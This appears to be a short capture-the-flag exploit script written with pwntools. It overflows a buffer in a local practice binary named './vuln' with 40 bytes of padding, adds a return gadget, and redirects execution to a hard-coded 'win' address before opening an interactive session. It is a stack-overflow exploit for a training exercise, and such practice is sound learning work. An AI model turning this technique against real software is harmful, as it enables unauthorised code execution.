# you can try this payload to get ret2win

from pwn import *

elf = context.binary = ELF('./vuln')
ly = process()

target = p64(0x401176)
ret = 0x4011ea

offset = 40

payload = flat(
    'A'*offset,
    p64(ret),
    target
)

ly.sendline(payload)

ly.interactive()
